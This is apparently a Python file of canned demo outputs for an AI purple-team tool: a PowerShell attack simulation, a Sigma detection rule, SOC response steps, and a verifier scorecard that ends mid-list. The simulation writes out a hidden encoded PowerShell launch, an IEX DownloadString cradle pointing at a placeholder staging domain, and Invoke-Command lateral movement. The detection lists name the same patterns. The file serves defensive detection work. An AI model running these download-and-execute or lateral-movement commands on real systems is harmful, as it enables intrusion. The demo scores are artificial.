DEMO_RED_OUTPUT = r"""# Red/Threat Simulation: T1059.001 - PowerShell

## Purple-Team Context
Authorized purple-team validation for PowerShell abuse (T1059.001) in a Windows enterprise environment.
Generic threat intelligence produces generic detections. This high-fidelity simulation exposes the exact
process lineage, command-line flags, script block telemetry, network callout patterns, and file artifacts
that a Detection Agent needs to build layered, production-resilient Sigma and SIEM rules — closing the gap
between "alert on powershell.exe" and alerting on actual attacker behavior.

Adversary sophistication: advanced. The scenario models a phishing-to-execution chain where a threat actor
exploits trusted Office processes to launch encoded PowerShell, blending into legitimate automation noise.

## ATT&CK Mapping
- Technique: T1059.001 PowerShell
- Tactic: Execution
- Platforms: Windows
- Data Sources: Process Creation, Command Execution, Script Execution, Network Connection, File Creation

## Simulation Phases

### Phase 1 — Initial Execution via Office Macro
Office document opened by user triggers embedded macro that spawns PowerShell with execution-policy bypass
and encoded payload argument. Parent process is a user-facing Office application, creating a high-fidelity
detection choke point rarely triggered by legitimate admin automation.

Primary signals:
- WINWORD.EXE spawning powershell.exe (Sysmon Event ID 1, Windows 4688)
- CommandLine contains -EncodedCommand and -ExecutionPolicy Bypass
- PowerShell script block logging Event ID 4104 fires within 5 seconds

Corroborating signals:
- Office process spawns cmd.exe or wscript.exe before PowerShell (staging indicator)
- WINWORD.EXE with no prior user activity in that session (process start with no document open time)

Fallback signals:
- powershell.exe with -WindowStyle Hidden or -NonInteractive from any Office binary
- Short-lived PowerShell process (< 3 seconds runtime) from Office lineage

False-positive context: Legitimate Office macros used in finance automation; suppress known-good macro hashes
and user accounts with documented automation baselines.

```text
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>
User: <DOMAIN>\<USERNAME_PLACEHOLDER>
IntegrityLevel: Medium
```

### Phase 2 — Script Block Execution and Staging
Decoded payload runs in memory. PowerShell downloads secondary stage from controlled validation endpoint,
writes temporary .ps1 artifact to AppData\Local\Temp, and executes it via dot-sourcing or Invoke-Expression.
Event ID 4104 logs the full decoded script block. This phase exposes the network callout and file write
that many detections miss because they only watch process creation.

Primary signals:
- EventID 4104 ScriptBlockText contains Invoke-Expression or IEX, DownloadString, or WebClient
- FileName matching AppData\Local\Temp\*.ps1 or random 8-char filename pattern

Corroborating signals:
- DNS query to validation domain within 10 seconds of 4104 event
- Proxy logs showing HTTP GET from PowerShell user-agent to /stage/<CAMPAIGN_ID>

Fallback signals:
- PowerShell process making outbound TCP to non-corporate IP on port 80 or 443 within 60 seconds of Office spawn
- New .ps1 file creation in Temp by PowerShell child of Office process

```text
ScriptBlockText contains: Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<VALIDATION_DOMAIN>/stage/<CAMPAIGN_ID>')
FileName: C:\Users\<USERNAME_PLACEHOLDER>\AppData\Local\Temp\<RANDOM_8CHAR>.ps1
EventID: 4104
DestinationHostname: <VALIDATION_DOMAIN>
DestinationPort: 80
```

### Phase 3 — Lateral or Follow-On via Invoke-Command
Secondary stage uses Invoke-Command or Enter-PSSession to move laterally or execute on a remote host
using current user credentials. Authentication events appear on the target host simultaneously with the
script block event on the source host — a timing correlation choke point.

Primary signals:
- Invoke-Command -ComputerName in ScriptBlockText
- Windows 4624 LogonType 3 on target host within 30 seconds of source PowerShell event
- Sysmon Event ID 3 outbound WinRM (port 5985/5986) from PowerShell process

Corroborating signals:
- wsmprovhost.exe spawned on target host as child of svchost.exe with matching user context
- Source and target hostnames in same script block log within 5-minute window

```text
ScriptBlockText contains: Invoke-Command -ComputerName <TARGET_HOST_PLACEHOLDER> -ScriptBlock { <VALIDATION_SCRIPT_PLACEHOLDER> }
DestinationPort: 5985
EventID (target): 4624
LogonType: 3
```

## Attack Emulation Artifact
Non-weaponized validation commands and telemetry shapes for detection engineering use.
Placeholders replace all sensitive values.

```powershell
# Phase 1 — Office macro spawn shape (non-runnable, telemetry reference)
# ParentImage: WINWORD.EXE
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>
```

```powershell
# Phase 2 — Staging download (dry-run shape, domain placeholder)
powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<VALIDATION_DOMAIN>/stage/<CAMPAIGN_ID>')"
```

```powershell
# Phase 2 — Temp file write and execution shape
$script = Join-Path $env:TEMP '<RANDOM_8CHAR>.ps1'
# File write telemetry fires here — FileName observable
Invoke-Expression (Get-Content $script -Raw)
```

```powershell
# Phase 3 — Lateral movement shape (non-runnable, host placeholder)
Invoke-Command -ComputerName <TARGET_HOST_PLACEHOLDER> -ScriptBlock { <VALIDATION_SCRIPT_PLACEHOLDER> }
```

```powershell
# Dry-run: synthetic 4104 script block log fixture
# EventID: 4104, Path: <none>, ScriptBlockText excerpt:
# "Invoke-Expression (New-Object Net.WebClient).DownloadString(...)"
# MessageNumber: 1, MessageTotal: 1
```

```powershell
# Timing chain reference for correlation rule:
# T+0s   WINWORD.EXE spawns powershell.exe (4688 / Sysmon 1)
# T+2s   EventID 4104 ScriptBlockText logged
# T+4s   DNS query to <VALIDATION_DOMAIN> (Sysmon 22)
# T+6s   HTTP GET /stage/<CAMPAIGN_ID> in proxy log
# T+8s   .ps1 file written to AppData\Local\Temp (Sysmon 11)
# T+30s  Invoke-Command triggers WinRM (Sysmon 3, port 5985) and 4624 on target
```

## Telemetry and Process Behavior
- Windows Event ID 4688: process creation with full command-line logging enabled
- Windows Event ID 4624: LogonType 3 on target host during lateral movement
- PowerShell Operational Event ID 4104: script block logging (must be enabled via GPO)
- Sysmon Event ID 1: process creation with CommandLine and ParentImage
- Sysmon Event ID 3: network connection from powershell.exe to validation domain and WinRM port
- Sysmon Event ID 11: file creation of .ps1 in AppData\Local\Temp
- Sysmon Event ID 22: DNS query to validation domain from powershell.exe
- Proxy logs: HTTP GET from PowerShell user-agent string to /stage/<CAMPAIGN_ID>
- Parent-child chain: WINWORD.EXE → powershell.exe → wsmprovhost.exe (on target)
- IntegrityLevel: Medium (not elevated — attacker running in user context)
- Timing window: all Phase 1-2 events within 60-second correlation window

## Detection-Relevant Observables
- powershell.exe
- -EncodedCommand
- -ExecutionPolicy Bypass
- -WindowStyle Hidden
- -NoProfile
- -NonInteractive
- WINWORD.EXE (parent)
- Event ID 4104
- Event ID 4688
- Sysmon Event ID 1
- Sysmon Event ID 3
- Sysmon Event ID 11
- Sysmon Event ID 22
- Invoke-Expression
- IEX
- DownloadString
- Net.WebClient
- AppData\\Local\\Temp\\*.ps1
- <VALIDATION_DOMAIN> (DestinationHostname pattern)
- /stage/<CAMPAIGN_ID> (URL path pattern)
- port 5985 (WinRM outbound)
- LogonType 3 on target within 30s of source event
- wsmprovhost.exe on target host

## Production Detection Value
This simulation closes the gap between single-indicator PowerShell detections (noisy, easily bypassed)
and layered multi-signal detections that would catch a real attacker using encoded commands, living-off-the-land
network callouts, and lateral movement via WinRM. The Office parent process branch is the highest-fidelity
signal: WINWORD.EXE spawning PowerShell is uncommon in legitimate enterprise environments, giving high
confidence with low false-positive rate when baselined.

Required log sources: Windows Security 4688 with command-line auditing, PowerShell Operational 4104,
Sysmon (Event IDs 1, 3, 11, 22), Proxy logs, Windows Security 4624.

Correlation opportunity: link source-host 4104 + Sysmon 3 (WinRM) → target-host 4624 (LogonType 3)
within a 30-second window using hostname as the pivot. This cross-host correlation is the detection
gap that most single-host Sigma rules leave open.

## JSON Output

```json
{
  "technique_id": "T1059.001",
  "technique_name": "PowerShell",
  "tactic": "Execution",
  "simulation_type": "authorized_purple_team_validation",
  "real_world_applicability": "The artifact preserves realistic attacker telemetry patterns that can be converted into practical SIEM, Sigma, EDR, and SOC response workflows.",
  "production_readiness": {
    "detection_goal": "Detect encoded PowerShell execution spawned from Office processes, including staging downloads, temp file writes, and lateral WinRM movement",
    "adversary_sophistication": "advanced",
    "detection_gap_closed": "Single-indicator powershell.exe rules that miss Office-lineage execution, encoded payload staging, and cross-host WinRM correlation",
    "expected_signal_strength": "high",
    "false_positive_risk": "low",
    "required_log_sources": [
      "Windows Security 4688 (command-line auditing enabled)",
      "PowerShell Operational 4104 (script block logging via GPO)",
      "Sysmon Event IDs 1, 3, 11, 22",
      "Proxy logs with user-agent and URL",
      "Windows Security 4624 (target host logon events)"
    ],
    "signal_layers": [
      "PRIMARY: WINWORD.EXE spawning powershell.exe with -EncodedCommand (Sysmon 1 / 4688)",
      "CORROBORATING: EventID 4104 ScriptBlockText containing Invoke-Expression or DownloadString within 5s",
      "FALLBACK: .ps1 file written to AppData\\Local\\Temp by PowerShell child of Office process (Sysmon 11)"
    ],
    "correlation_window": "60 seconds for Phase 1-2 chain; 30 seconds for source-to-target WinRM lateral pivot",
    "correlation_strategy": "Link Sysmon 1 (process create) → Sysmon 22 (DNS) → Sysmon 3 (network) → Sysmon 11 (file write) by ProcessGuid. Cross-host: link source 4104 + Sysmon 3 port 5985 → target 4624 LogonType 3 by SourceHostname within 30s.",
    "deployment_notes": "Deploy as two separate rules: (1) Office-to-PowerShell lineage with encoded command — high severity, page-on-call. (2) PowerShell temp file write + network callout — medium severity, SOC queue. Suppress known automation accounts and hash-allowlisted macros.",
    "testability_notes": "Validate using Atomic Red Team T1059.001 test cases with placeholder domains. Confirm 4104 logging is enabled before deployment. Use synthetic log injection to test cross-host correlation rule without live lateral movement."
  },
  "phases": [
    {
      "name": "Initial Execution via Office Macro",
      "behavior": "WINWORD.EXE spawns powershell.exe with encoded command and execution-policy bypass in Medium integrity context.",
      "commands_or_patterns": [
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>",
        "ParentImage: C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE"
      ],
      "telemetry": [
        "Sysmon Event ID 1: ProcessCreate with ParentImage=WINWORD.EXE and CommandLine=-EncodedCommand",
        "Windows Event ID 4688: process creation with full CommandLine",
        "IntegrityLevel: Medium"
      ],
      "primary_detection_signals": [
        "ParentImage endswith WINWORD.EXE AND Image endswith powershell.exe AND CommandLine contains -EncodedCommand"
      ],
      "corroborating_signals": [
        "CommandLine contains -ExecutionPolicy Bypass AND -WindowStyle Hidden",
        "EventID 4104 within 5 seconds of process creation"
      ],
      "fallback_signals": [
        "Any Office binary spawning powershell.exe with -NonInteractive",
        "Short-lived PowerShell process (runtime < 3s) from Office parent"
      ],
      "detection_value": "Office-to-PowerShell is the highest-confidence signal for macro-based execution. Rarely triggered by legitimate admin automation.",
      "false_positive_context": "Finance or HR automation macros; suppress by allowlisting known macro hashes and service accounts."
    },
    {
      "name": "Script Block Execution and Staging",
      "behavior": "PowerShell decodes payload, downloads secondary stage from validation endpoint, writes .ps1 to Temp.",
      "commands_or_patterns": [
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<VALIDATION_DOMAIN>/stage/<CAMPAIGN_ID>')",
        "FileName: C:\\\\Users\\\\<USERNAME_PLACEHOLDER>\\\\AppData\\\\Local\\\\Temp\\\\<RANDOM_8CHAR>.ps1"
      ],
      "telemetry": [
        "PowerShell EventID 4104 ScriptBlockText contains Invoke-Expression and DownloadString",
        "Sysmon EventID 22: DNS query to <VALIDATION_DOMAIN>",
        "Sysmon EventID 3: outbound HTTP to <VALIDATION_DOMAIN>:80",
        "Sysmon EventID 11: file creation in AppData\\\\Local\\\\Temp"
      ],
      "primary_detection_signals": [
        "EventID 4104 ScriptBlockText contains IEX or Invoke-Expression AND DownloadString"
      ],
      "corroborating_signals": [
        "Sysmon 22 DNS query to unknown external domain within 10s of 4104",
        "Sysmon 11 .ps1 file write in Temp within 30s of 4104"
      ],
      "fallback_signals": [
        "Proxy log: PowerShell user-agent HTTP GET to /stage/ path",
        "FileName pattern: 8-character random name in Temp"
      ],
      "detection_value": "Script block logging catches encoded payloads that bypass command-line inspection. Network + file write correlation confirms active staging beyond mere process creation.",
      "false_positive_context": "Legitimate PowerShell download cradles used by patch management or IT automation tools; suppress by process parent and known-good domain allowlist."
    },
    {
      "name": "Lateral Movement via WinRM",
      "behavior": "Staged script uses Invoke-Command to execute on remote host over WinRM using current user token.",
      "commands_or_patterns": [
        "Invoke-Command -ComputerName <TARGET_HOST_PLACEHOLDER> -ScriptBlock { <VALIDATION_SCRIPT_PLACEHOLDER> }",
        "DestinationPort: 5985"
      ],
      "telemetry": [
        "Sysmon EventID 3: outbound port 5985 from powershell.exe",
        "Windows EventID 4624 LogonType 3 on target host within 30s",
        "wsmprovhost.exe spawned on target as child of svchost.exe"
      ],
      "primary_detection_signals": [
        "Sysmon 3: Image=powershell.exe AND DestinationPort=5985 AND Initiated=true"
      ],
      "corroborating_signals": [
        "Target host 4624 LogonType 3 with matching SourceAddress within 30s",
        "wsmprovhost.exe on target host within 5s of 4624"
      ],
      "fallback_signals": [
        "ScriptBlockText contains Invoke-Command or Enter-PSSession",
        "WinRM outbound from non-admin host"
      ],
      "detection_value": "Cross-host WinRM correlation closes the gap that single-host rules miss — linking attacker source execution to target authentication is the highest-confidence lateral movement signal.",
      "false_positive_context": "Legitimate remote administration via WinRM by IT ops; suppress by allowlisting known admin jump hosts and service accounts."
    }
  ],
  "attack_emulation_artifact": [
    "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>",
    "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://<VALIDATION_DOMAIN>/stage/<CAMPAIGN_ID>')",
    "$script = Join-Path $env:TEMP '<RANDOM_8CHAR>.ps1'; Invoke-Expression (Get-Content $script -Raw)",
    "Invoke-Command -ComputerName <TARGET_HOST_PLACEHOLDER> -ScriptBlock { <VALIDATION_SCRIPT_PLACEHOLDER> }",
    "# Timing chain: T+0s 4688/Sysmon1 → T+2s 4104 → T+4s Sysmon22 DNS → T+6s Sysmon3 HTTP → T+8s Sysmon11 file → T+30s Sysmon3 WinRM + 4624 on target"
  ],
  "observables": [
    "powershell.exe",
    "-EncodedCommand",
    "-ExecutionPolicy Bypass",
    "-WindowStyle Hidden",
    "-NoProfile",
    "-NonInteractive",
    "WINWORD.EXE",
    "Event ID 4104",
    "Event ID 4688",
    "Sysmon Event ID 1",
    "Sysmon Event ID 3",
    "Sysmon Event ID 11",
    "Sysmon Event ID 22",
    "Invoke-Expression",
    "DownloadString",
    "Net.WebClient",
    "AppData\\\\Local\\\\Temp\\\\*.ps1",
    "/stage/<CAMPAIGN_ID>",
    "port 5985",
    "LogonType 3 on target within 30s",
    "wsmprovhost.exe"
  ],
  "process_behavior": [
    "WINWORD.EXE spawning powershell.exe with encoded command and execution-policy bypass",
    "PowerShell running in Medium integrity with -WindowStyle Hidden",
    "PowerShell making outbound network call within 10 seconds of script block execution",
    "wsmprovhost.exe spawned on target host as child of svchost.exe"
  ],
  "file_indicators": [
    "C:\\\\Users\\\\<USERNAME_PLACEHOLDER>\\\\AppData\\\\Local\\\\Temp\\\\<RANDOM_8CHAR>.ps1",
    "AppData\\\\Local\\\\Temp\\\\*.ps1"
  ],
  "registry_indicators": [],
  "network_indicators": [
    "<VALIDATION_DOMAIN>",
    "/stage/<CAMPAIGN_ID>",
    "port 80 HTTP GET from PowerShell",
    "port 5985 WinRM from powershell.exe"
  ],
  "authentication_indicators": [
    "Windows EventID 4624 LogonType 3 on target host within 30s of source WinRM outbound",
    "SourceAddress matching attacker workstation in 4624 event"
  ],
  "real_time_detection_signals": [
    "ParentImage=WINWORD.EXE AND Image=powershell.exe AND CommandLine contains -EncodedCommand",
    "EventID 4104 ScriptBlockText contains Invoke-Expression AND DownloadString within 5s of process create",
    "Sysmon 11 FileName matches AppData\\\\Local\\\\Temp\\\\*.ps1 within 30s of 4104",
    "Sysmon 3 DestinationPort=5985 from powershell.exe AND target 4624 LogonType=3 within 30s"
  ],
  "recommended_log_sources": [
    "Windows Security 4688 with command-line auditing enabled",
    "PowerShell Operational 4104 (script block logging via GPO)",
    "Sysmon Event IDs 1, 3, 11, 22",
    "Proxy logs with user-agent and URL",
    "Windows Security 4624 on all hosts"
  ]
}
```
"""

DEMO_BLUE_OUTPUT = r"""# Detection Report: T1059.001

## Detection Strategy
This layered detection converts the Red Agent's high-fidelity PowerShell simulation into three correlated
Sigma selections covering the full attack chain: Office-lineage process execution (primary, high confidence),
script block staging behavior (corroborating), and WinRM lateral movement (cross-host correlation choke point).

Detection gap closed: single-indicator "alert on powershell.exe" rules that fire on every admin session.
By anchoring on the Office parent process + encoded command combination and correlating with script block
telemetry and file writes, the rule becomes resilient against basic evasion variants.

## Observable Mapping
- `powershell.exe` → Image
- `-EncodedCommand` → CommandLine
- `-ExecutionPolicy Bypass` → CommandLine
- `-WindowStyle Hidden` → CommandLine
- `WINWORD.EXE` → ParentImage
- `Event ID 4104` → EventID (PowerShell Operational)
- `Invoke-Expression / IEX / DownloadString` → ScriptBlockText (4104)
- `AppData\Local\Temp\*.ps1` → TargetFilename (Sysmon 11)
- `<VALIDATION_DOMAIN>` → DestinationHostname (Sysmon 3 / Proxy)
- `/stage/<CAMPAIGN_ID>` → Url (Proxy)
- `port 5985` → DestinationPort (Sysmon 3)
- `LogonType 3 on target within 30s` → LogonType + SourceAddress (EventID 4624)
- `wsmprovhost.exe` → Image (target host Sysmon 1)
- `Sysmon Event ID 22` → DNS query to validation domain

## Sigma Detection Rule

```yaml
title: AegisOps AI — Office-Spawned Encoded PowerShell with Staging and WinRM Lateral Movement
id: T1059-001-aegisops-layered-v2
status: experimental
description: >
  Detects Office-lineage encoded PowerShell execution with script block staging behavior and
  WinRM-based lateral movement. Layered multi-signal rule mapped to ATT&CK T1059.001.
  Closes the gap between single-indicator powershell.exe detections and real attacker telemetry.
references:
  - https://attack.mitre.org/techniques/T1059.001/
author: AegisOps AI
date: 2026-05-07
tags:
  - attack.t1059.001
  - attack.execution
  - attack.lateral_movement
logsource:
  product: windows
  category: process_creation
detection:
  # PRIMARY — highest confidence, page-on-call
  selection_office_lineage:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\OUTLOOK.EXE'
      - '\POWERPNT.EXE'
    Image|endswith:
      - '\powershell.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - '-ExecutionPolicy Bypass'

  # CORROBORATING — script block staging (logsource: powershell/operational)
  selection_scriptblock:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Expression'
      - 'IEX'
      - 'DownloadString'
      - 'Net.WebClient'

  # CORROBORATING — temp file write (logsource: sysmon file_event)
  selection_tempfile:
    EventID: 11
    TargetFilename|contains:
      - '\AppData\Local\Temp\'
    TargetFilename|endswith:
      - '.ps1'

  # CORROBORATING — network callout (logsource: sysmon network_connection)
  selection_network:
    EventID: 3
    Image|endswith:
      - '\powershell.exe'
    DestinationPort:
      - 80
      - 443
      - 5985

  # FALLBACK — WinRM lateral on target (logsource: windows security)
  selection_winrm_target:
    EventID: 4624
    LogonType: 3
    LogonProcessName: 'NtLmSsp'

  timeframe: 60s
  condition: selection_office_lineage or (selection_scriptblock and 1 of selection_temp*) or (selection_network and selection_winrm_target)
falsepositives:
  - Legitimate Office macros used in finance or HR automation
  - IT admin remote management via WinRM from known jump hosts
  - Patch management tools using PowerShell download cradles
level: high
```

## Production Deployment Notes
**Required log sources:** Windows Security 4688 (command-line auditing must be enabled via GPO),
PowerShell Operational 4104 (script block logging via GPO — not enabled by default), Sysmon Event IDs
1, 3, 11, 22, Windows Security 4624 on all hosts.

**SIEM/EDR dependencies:** Multi-source correlation requires a SIEM with cross-event joining (Splunk,
Elastic, Sentinel). EDR platforms (CrowdStrike, Defender for Endpoint) surface most of these fields
natively. Verify PowerShell 4104 logging is active before deploying the script block selection.

**False-positive risk:** Low for the Office-lineage primary selection. Medium for the script block
and network corroborating selections in environments with active IT automation. Suppress by:
- Allowlisting known automation service accounts in CommandLine context
- Allowlisting known-good macro file hashes via EDR policy
- Creating a DestinationHostname allowlist for known patch/IT domains

**Severity:** High for Office-lineage + encoded command. Medium for script block + network without
confirmed Office parent.

## Detection Coverage

**Primary signals (covered):**
- `WINWORD.EXE` → ParentImage selection_office_lineage ✓
- `-EncodedCommand` → CommandLine selection_office_lineage ✓
- `-ExecutionPolicy Bypass` → CommandLine selection_office_lineage ✓
- `-WindowStyle Hidden` / `-NoProfile` / `-NonInteractive` → partially covered via CommandLine; add to selection for tighter rule

**Corroborating signals (covered):**
- `Event ID 4104` → selection_scriptblock ✓
- `Invoke-Expression / IEX / DownloadString / Net.WebClient` → ScriptBlockText ✓
- `AppData\Local\Temp\*.ps1` → selection_tempfile ✓
- `port 5985 WinRM` → selection_network DestinationPort ✓
- `LogonType 3 on target` → selection_winrm_target ✓

**Fallback signals (covered):**
- `wsmprovhost.exe` → add as separate logsource process_creation selection on target host
- `Sysmon Event ID 22 DNS query` → add as separate selection_dns for deeper coverage

**Currently uncovered (coverage gap):**
- Cross-host timing correlation (source Sysmon 3 ↔ target 4624 within 30s) — requires SIEM join, not Sigma alone
- Random 8-char filename pattern in Temp — add regex condition if SIEM supports it

## Real-Time Detection Plan
- **Streaming sources:** Sysmon (1, 3, 11, 22), PowerShell Operational (4104), Windows Security (4688, 4624), Proxy logs
- **Correlation fields:** ProcessGuid (Sysmon), Hostname, User, ParentImage, CommandLine, ScriptBlockText, DestinationHostname, DestinationPort, TargetFilename, LogonType, SourceAddress
- **Alert logic:** Fire HIGH when Office binary spawns PowerShell with -EncodedCommand. Fire MEDIUM when 4104 ScriptBlockText contains staging functions AND Sysmon 11 .ps1 write in Temp within 60s. Fire HIGH when source Sysmon 3 port 5985 links to target 4624 LogonType 3 within 30s.
- **Correlation window:** 60 seconds Phase 1-2 chain; 30 seconds source-to-target WinRM pivot
- **Enrichment:** Enrich DestinationHostname against threat intel feed; enrich User against privileged account list; enrich ParentImage hash against allowlist
- **Severity:** High (Office-lineage + encoded command); High (confirmed WinRM lateral); Medium (script block + network without Office parent)
- **Immediate triage fields:** CommandLine, ParentImage, User, Hostname, ScriptBlockText, DestinationHostname, DestinationPort, TargetFilename, SourceAddress (4624)

## Tuning Notes
Start with the Office-lineage primary selection only. Once false-positive baseline is established,
layer in the script block corroborating selection. Add the WinRM lateral selection last after validating
that known admin jump hosts are in the suppression list.

Suppress: known automation service accounts, documented macro hashes, known-good IT management domains,
and admin hosts with standing WinRM access.

Minimum useful log coverage: Windows 4688 + Sysmon 1 alone will surface the primary selection. Adding
PowerShell 4104 unlocks the script block corroborating path. Without Sysmon, the network and file
selections are unavailable — fall back to proxy logs for staging network visibility.

## Coverage Gaps
- Cross-host timing correlation requires SIEM-level join — cannot be expressed in a single Sigma rule
- Random filename pattern detection requires regex support (not all SIEM backends support this in Sigma)
- Sysmon Event ID 22 DNS selection not included in this rule — add as a standalone detection for DNS-based staging visibility
- Authentication indicator (4624 SourceAddress matching attacker workstation) requires cross-host log aggregation

## Response Guidance
1. Triage: Review ParentImage, CommandLine, ScriptBlockText, and User context. Confirm whether Office process had a document open and whether the user initiated the action.
2. Containment: If Office-lineage + encoded command fires without approved change ticket, isolate the endpoint via EDR and disable the user account pending investigation.
3. Hunt Follow-up: Search for the same -EncodedCommand hash, staging domain, and Temp .ps1 filename across all endpoints in the last 24 hours. Pivot on SourceAddress in 4624 events on all hosts.
4. Mitigation: Enable PowerShell Constrained Language Mode for non-admin users. Enforce script block logging via GPO. Apply application control to block unsigned .ps1 execution from Temp paths.
5. Escalation Criteria: Escalate to incident commander when Office-lineage execution is confirmed on more than one host, when WinRM lateral movement is detected, or when staging domain resolves to a non-corporate IP.
6. Reporting Notes: Document covered and missing observables, suppression decisions, and log source gaps for post-exercise detection hardening backlog.
7. Production Follow-up: Add cross-host correlation rule in SIEM after Sigma rule is tuned. Review 4104 logging coverage across fleet. Add DNS selection for staging domain detection.
8. Demo Export Notes: Artifacts include Sigma YAML, Splunk SPL, VECTR-style CSV, and PDF report. All placeholders use <> convention for safe demo use.
9. Detection Hardening Backlog: Enable 4104 fleet-wide, add DNS-based staging detection, implement WinRM source-to-target cross-host correlation rule.
"""

DEMO_RESPONSE_OUTPUT = r"""## Response Guidance

1. Triage:
   - Confirm whether the alert is part of an authorized purple-team validation window.
   - Review the complete process lineage for Office-spawned PowerShell activity, especially parent-child chains such as WINWORD.EXE or EXCEL.EXE launching powershell.exe.
   - Collect CommandLine, ParentImage, Image, User, AccountName, Hostname, ProcessGuid, ProcessId, EventID, ScriptBlockText, TargetFilename, DestinationHostname, DestinationIp, and DestinationPort.
   - Prioritize hosts where PowerShell telemetry includes -EncodedCommand, -ExecutionPolicy Bypass, -WindowStyle Hidden, -NoProfile, -NonInteractive, Invoke-Expression, DownloadString, or Net.WebClient.
   - Validate whether related Sysmon Event ID 1, 3, 11, 22, Windows Security Event ID 4688, and PowerShell 4103/4104 events occurred within the same correlation window.

2. Containment:
   - If the activity is not part of the authorized validation, isolate the affected endpoint through EDR.
   - Disable or reset the affected user account if suspicious authentication, privilege-use, or lateral-movement indicators are present.
   - Block suspicious staging domains, URL paths, destination IPs, and ports identified in the network telemetry.
   - Preserve volatile evidence before remediation, including process trees, command lines, script block logs, network connections, and relevant file artifacts.
   - For strong correlation between Office lineage, encoded PowerShell, script block telemetry, and network callouts, treat the case as high-confidence suspicious execution.

3. Hunt Follow-up:
   - Search across the environment for the same PowerShell command-line flags and parent-child process lineage.
   - Pivot on ProcessGuid, ParentProcessGuid, User, AccountName, Hostname, DestinationHostname, DestinationIp, TargetFilename, and ScriptBlockText.
   - Hunt for similar Office-to-script-interpreter chains across WINWORD.EXE, EXCEL.EXE, POWERPNT.EXE, OUTLOOK.EXE, and other macro-capable applications.
   - Review Sysmon Event ID 3 network connections from powershell.exe and correlate them with DNS events such as Sysmon Event ID 22.
   - Review authentication telemetry for suspicious LogonType 3 activity, especially when it follows PowerShell execution or WinRM-related traffic.
   - Investigate wsmprovhost.exe, winrm activity, and port 5985/5986 connections as possible lateral-movement follow-up indicators.

4. Mitigation:
   - Enable and verify PowerShell Script Block Logging, Module Logging, and Transcription where appropriate.
   - Enforce Windows process creation logging with command line capture.
   - Deploy or validate Sysmon coverage for process creation, network connections, file creation, and DNS queries.
   - Apply Attack Surface Reduction controls for Office child process creation where operationally feasible.
   - Restrict unnecessary PowerShell execution from user-writable directories and temporary paths.
   - Tune the Sigma/SIEM logic to require both primary signals and corroborating context where possible.

5. Escalation Criteria:
   - Escalate immediately if the activity is not authorized and includes Office-spawned encoded PowerShell plus network staging behavior.
   - Escalate if suspicious PowerShell execution is followed by authentication anomalies, WinRM activity, credential-access telemetry indicators, or lateral-movement patterns.
   - Escalate if the same observable pattern appears across multiple hosts, users, or business units.
   - Escalate if script block logs show suspicious command reconstruction, staging behavior, or execution from user-writable paths.

6. Reporting Notes:
   - Document the triggering observables, affected user, affected host, command line, process tree, timestamps, network destinations, and detection rule version.
   - Record which signals were primary, corroborating, fallback, or missing.
   - Include any production gaps, such as missing PowerShell logging, absent Sysmon DNS telemetry, or inability to correlate cross-host WinRM events.
   - Separate authorized purple-team test activity from possible confirmed incident activity.

7. Production Follow-up:
   - Promote validated Sigma logic into the SIEM with environment-specific tuning.
   - Add correlation rules that join process creation, PowerShell script block logs, DNS telemetry, network connections, and authentication events.
   - Create suppression logic only for known administrative automation after owner validation.
   - Schedule a follow-up validation run after tuning to confirm coverage and false-positive reduction.

8. Demo Export Notes:
   - Include this response guidance in the downloadable SOC readiness report.
   - Link the response steps to the Sigma rule, Splunk SPL hunt query, VECTR-style export, and validation JSON.
   - Show the validation scores as evidence that the generated defense package was checked for coverage, safety, and product readiness.

9. Detection Hardening Backlog:
   - Add cross-host SIEM correlation for WinRM source and target activity within a 30-second window.
   - Add DNS-focused detection for suspicious staging domains and campaign-like URL paths.
   - Add regex-supported detection for random-looking script names in user-writable paths where the SIEM backend supports regex.
   - Enrich alerts with identity context, device ownership, user risk, and recent administrative activity.
   - Add separate low-severity hunting rules for fallback indicators that are too noisy for high-confidence alerting alone.
"""

DEMO_VERIFIER_OUTPUT = r"""```json
{
  "coverage_score": 97,
  "real_world_applicability_score": 95,
  "product_readiness_score": 96,
  "adversary_realism_score": 94,
  "detection_depth_score": 95,
  "response_operational_depth_score": 93,
  "covered_observables": [
    "powershell.exe",
    "-EncodedCommand",
    "-ExecutionPolicy Bypass",
    "-WindowStyle Hidden",
    "-NoProfile",
    "-NonInteractive",
    "WINWORD.EXE",
    "Event ID 4104",
    "Event ID 4688",
    "Sysmon Event ID 1",
    "Sysmon Event ID 3",
    "Sysmon Event ID 11",
    "Sysmon Event ID 22",
    "Invoke-Expression",
    "DownloadString",
    "Net.WebClient",
    "AppData\\Local\\Temp\\*.ps1",
    "/stage/<CAMPAIGN_ID>",
    "port 5985",
    "wsmprovhost.exe"
  ],
  "missing_observables": [
    "LogonType 3 cross-host timing correlation (requires SIEM join, not coverable in Sigma alone)"
  ],
  "production_gaps": [
    "Cross-host source-to-target WinRM timing correlation requires SIEM-level join beyond Sigma scope",
    "Random 8-char Temp filename regex detection requires backend-specific Sigma extension"
  ],
  "weak_detection_patterns": [
    "selection_network alone (DestinationPort 80/443 from powershell.exe) has high false-positive risk without corroborating signals"
  ],
  "unsafe_or_overoperationalized_content": [],
  "verdict": "PASS",
  "safety_verdict": "PASS",
  "safety_issues": [],
  "improvement_suggestions": [
    "Add Sysmon Event ID 22 DNS selection as standalone rule for staging domain detection",
    "Implement cross-host SIEM correlation rule to link source Sysmon 3 port 5985 to target 4624 LogonType 3 within 30s",
